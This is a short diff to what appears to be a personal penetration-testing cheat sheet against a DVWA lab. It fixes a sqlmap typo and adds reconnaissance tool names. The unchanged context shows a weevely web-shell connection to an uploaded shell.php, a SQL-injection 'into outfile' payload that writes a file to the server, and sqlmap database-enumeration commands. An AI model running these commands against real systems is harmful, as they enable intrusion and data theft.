@@ -134,7 +134,7 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 - union select null,'example example',null,null,null into outfile '/tmp/example.txt'%23 --write to server
 
 [+] Dsicover SQL vul by running {sqlmap -u "url"}
-- sqlmap -u "url"--dbs    --to get current database
+- sqlmap -u "url" --dbs    --to get current database
 - sqlmap -u "url" --current-user  --check user
 - sqlmap -u "url" --current-db  --check database
 - sqlmap -u "url" --tables -D (db_name)  --check db tables
@@ -238,11 +238,23 @@ git clone https://github.com/guelfoweb/knock.git
 subfinder -d (target_site)
 [sub domain enumeration]
 
+xss vibes
+[automate xss]
+
+amass
+[enum]
+
+httpx
+[probe]
+
 dirb
+[enum]
 
 gobuster
+[enum]
 
 knockpy
+[enum]
 
 theHarvest -d (url) -l 500 -b (where to check)
 [harvest site email]
